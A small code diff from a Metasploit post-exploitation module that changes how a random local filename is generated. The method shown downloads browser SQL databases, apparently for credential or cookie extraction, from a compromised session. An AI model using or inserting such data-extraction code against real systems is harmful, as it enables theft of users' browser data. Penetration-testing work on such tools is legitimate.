@@ -450,7 +450,7 @@ class MetasploitModule < Msf::Post
 
   def extract_sql_data(db_path, query, data_type, browser, encryption_key = nil)
     if file?(db_path)
-      db_local_path = "#{Rex::Text.rand_text_alpha(8)}.db"
+      db_local_path = "#{Rex::Text.rand_text_alpha(8, 12)}.db"
       session.fs.file.download_file(db_local_path, db_path)
 
       begin
